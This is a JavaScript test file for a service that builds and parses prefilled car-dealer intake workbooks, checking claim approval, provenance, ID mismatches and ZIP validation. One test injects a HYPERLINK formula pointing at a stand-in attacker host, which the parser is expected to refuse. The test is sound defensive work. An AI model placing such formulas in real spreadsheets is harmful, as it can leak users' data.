import test from 'node:test';
import assert from 'node:assert/strict';
import ExcelJS from 'exceljs';
import {
  buildPrefilledDealerWorkbook,exportPrefilledDealerWorkbook,
  parseCompletedDealerWorkbook,validateXlsxZip,PREFILL_CONTRACT_VERSION,
} from '../services/dealer/dealerWorkbookRoundtrip.js';

const claim=Object.freeze({
  claim_id:'c63ef593-6e41-4ed5-8026-26b7ad451c46',
  claimant_user_id:'applicant1',seed_dealer_id:'ZW-DEAL-0001',
  claimed_scope:'BRANCH',claim_status:'CLAIM_APPROVED',
});
const source=Object.freeze({
  seed_dealer_id:'ZW-DEAL-0001',
  source_row_sha256:'a'.repeat(64),
  source_snapshot:{
    'Seed Dealer ID':'ZW-DEAL-0001',
    'Dealer / Company Name':'TEST FIXTURE Car Sales',
    'Physical Address':'Fixture only street',
    'Suburb / Area':'Fixture Suburb',
    'City / Town':'Harare',
    'Phone / WhatsApp':'+263 FIXTURE',
    'Website / Source URL':'https://example.invalid',
  },
});
async function withLegalName(){
  const wb=await buildPrefilledDealerWorkbook(claim,source,{
    issuedAt:new Date('2026-11-03T00:00:00Z'),
  });
  const business=wb.getWorksheet('BUSINESS');
  business.getRow(2).getCell(4).value='Test Legal Business Ltd';
  return wb;
}
async function serialized(wb){return Buffer.from(await wb.xlsx.writeBuffer())}
test('D3 approved claim generates unique private research candidates and honest provenance',async()=>{
  const wb=await buildPrefilledDealerWorkbook(claim,source,{issuedAt:new Date('2026-11-03T00:00:00Z')});
  assert.equal(wb.worksheets.length,12);
  const b=wb.getWorksheet('BUSINESS');
  assert.equal(b.getRow(2).getCell(1).value,claim.claim_id);
  assert.equal(b.getRow(2).getCell(2).value,'ZW-DEAL-0001');
  assert.equal(b.getRow(2).getCell(3).value,'TEST FIXTURE Car Sales');
  assert.equal(b.getRow(2).getCell(4).value,''); // Legal identity not fabricated
  const branch=wb.getWorksheet('BRANCHES');
  assert.equal(branch.getRow(2).getCell(1).value,'BR-ZW-DEAL-0001');
  assert.equal(branch.getRow(2).getCell(7).value,'Harare');
  assert.equal(branch.getRow(2).getCell(15).value,'+263 FIXTURE','source phone is not corrupted by a CSV-style apostrophe');
  const values=wb.getWorksheet('README - Instructions').getColumn(2).values;
  assert.ok(values.includes(PREFILL_CONTRACT_VERSION));
  assert.ok(values.includes(source.source_row_sha256));
  assert.ok(values.includes('Research/UNVERIFIED. Contact and branch data require confirmation; never trust research categories as licences.'));
});
test('D3 research source access refuses pending/unapproved claims',async()=>{
  for(const state of ['AWAITING_DOCUMENTARY_EVIDENCE','CLAIM_REJECTED','CLAIM_DISPUTED','CLAIM_REVOKED']){
    await assert.rejects(
      exportPrefilledDealerWorkbook({...claim,claim_status:state},source),
      /CLAIM_NOT_APPROVED/
    );
  }
  await assert.rejects(
    exportPrefilledDealerWorkbook(claim,{...source,seed_dealer_id:'ZW-DEAL-0002'}),
    /SOURCE_CUSTODY_MISMATCH/
  );
});
test('D3 full workbook roundtrip preserves researched city, branch and applicant legal name',async()=>{
  const wb=await withLegalName();
  const bytes=await serialized(wb);
  const limits=validateXlsxZip(bytes);
  assert.ok(limits.parts>5);
  const {document,record_counts,review_state,has_authority_writes}=await parseCompletedDealerWorkbook(bytes,claim,source);
  assert.equal(document.schema,'CARUP_DEALER_INTAKE_1_0');
  assert.equal(document.tab_rows.BUSINESS[0].legal_name,'Test Legal Business Ltd');
  assert.equal(document.tab_rows.BUSINESS[0].research_display_name,'TEST FIXTURE Car Sales');
  assert.equal(document.tab_rows.BRANCHES[0].city,'Harare');
  assert.equal(document.tab_rows.BRANCHES[0].business_contact_phone,'+263 FIXTURE','no retyping or apostrophe pollution');
  assert.equal(document.tab_rows.BRANCHES[0].source_confirmation,'UNKNOWN');
  assert.equal(record_counts.BRANCHES,1);
  assert.equal(has_authority_writes,false);
  assert.equal(review_state,'CANDIDATE_AWAITING_COMPLIANCE');
});
test('D3 self-written claim id or private source crosswalk mismatch rejected',async()=>{
  const wb=await withLegalName();
  wb.getWorksheet('BUSINESS').getCell(2,1).value='cross-claim';
  await assert.rejects(parseCompletedDealerWorkbook(await serialized(wb),claim,source),
    /WORKBOOK_CLAIM_REFERENCE_MISMATCH/);
  wb.getWorksheet('BUSINESS').getCell(2,1).value=claim.claim_id;
  wb.getWorksheet('BRANCHES').getCell(2,2).value='ZW-DEAL-0104';
  await assert.rejects(parseCompletedDealerWorkbook(await serialized(wb),claim,source),
    /CROSS_SOURCE_BRANCH_REFERENCE/);
});
test('D3 workbook spreadsheet formula injection refused even with a valid claim',async()=>{
  const wb=await withLegalName();
  wb.getWorksheet('BUSINESS').getCell(2,4).value={formula:'HYPERLINK("https://evil.invalid/?data=1")',result:'Fake'};
  await assert.rejects(parseCompletedDealerWorkbook(await serialized(wb),claim,source),
    /WORKBOOK_FORMULA_REFUSED/);
});
test('D3 duplicate branch and orphan child row cannot sneak through',async()=>{
  const wb=await withLegalName();
  const first=wb.getWorksheet('BRANCHES');
  const duplicate=first.getRow(2).values.slice(1);
  first.addRow(duplicate);
  await assert.rejects(parseCompletedDealerWorkbook(await serialized(wb),claim,source),
    /DUPLICATE_OR_MISSING_BRANCH_REF/);
  first.spliceRows(3,1);
  const licences=wb.getWorksheet('LICENCES_AUTHORIZATIONS');
  licences.getRow(2).getCell(2).value='BR-OTHER-BUSINESS';
  await assert.rejects(parseCompletedDealerWorkbook(await serialized(wb),claim,source),
    /ORPHAN_BRANCH_REFERENCE/);
});
test('D3 dangerous zip envelopes, oversized inputs, and false file types refused',()=>{
  assert.throws(()=>validateXlsxZip(Buffer.from('%PDF-1.7')),/INVALID_WORKBOOK_SIZE|NOT_XLSX_ZIP/);
  assert.throws(()=>validateXlsxZip(Buffer.alloc(9*1024*1024)),/INVALID_WORKBOOK_SIZE/);
  const invalid=Buffer.alloc(75);
  invalid.writeUInt32LE(0x04034b50,0);
  assert.throws(()=>validateXlsxZip(invalid),/INVALID_ZIP_DIRECTORY/);
});
test('D3 child references without branch fail before any canonical business write',async()=>{
  const wb=await withLegalName();
  const lic=wb.getWorksheet('LICENCES_AUTHORIZATIONS');
  lic.getRow(2).getCell(2).value='UNKNOWN';
  await assert.rejects(parseCompletedDealerWorkbook(await serialized(wb),claim,source),/ORPHAN_BRANCH_REFERENCE/);
});
